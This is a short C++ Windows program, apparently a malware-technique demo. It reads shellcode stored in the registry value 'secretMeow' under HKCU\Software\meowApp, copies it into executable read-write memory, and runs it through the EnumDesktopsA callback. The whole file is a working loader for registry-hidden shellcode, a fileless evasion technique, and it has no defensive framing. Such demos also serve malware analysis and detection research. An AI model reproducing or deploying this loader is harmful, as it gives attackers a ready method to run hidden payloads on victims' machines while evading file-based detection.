#include <windows.h>
#include <stdio.h>
#include <iostream>

void registryGetData() {
    

  HKEY hkey;
  DWORD size = 0;
  const char* secret = "Software\\meowApp";

  LSTATUS res = RegOpenKeyEx(HKEY_CURRENT_USER, (LPCSTR)secret, 0, KEY_READ, &hkey);
  printf(res != ERROR_SUCCESS ? "failed to open reg key :(\n" : "successfully open reg key:)\n");

  res = RegQueryValueEx(hkey, (LPCSTR)"secretMeow", nullptr, nullptr, nullptr, &size);
  printf(res != ERROR_SUCCESS ? "failed to query data size :(\n" : "successfully get binary data size:)\n");

  // allocate memory for the data
  BYTE *data = new BYTE[size];

  res = RegQueryValueEx(hkey, (LPCSTR)"secretMeow", nullptr, nullptr, data, &size);
  printf(res != ERROR_SUCCESS ? "failed to query data :(\n" : "successfully get binary data:)\n");

  printf("data:\n");
  for (int i = 0; i < size; i++) 
  {
    printf("\\x%02x", static_cast<int>(data[i]));
  }

  LPVOID mem = VirtualAlloc(NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
  RtlMoveMemory(mem, data, size);
  EnumDesktopsA(GetProcessWindowStation(), (DESKTOPENUMPROCA)mem, 0);
  
  RegCloseKey(hkey);
  delete[] data;
}

int main(void) 
{
  registryGetData();  
  return 0;
}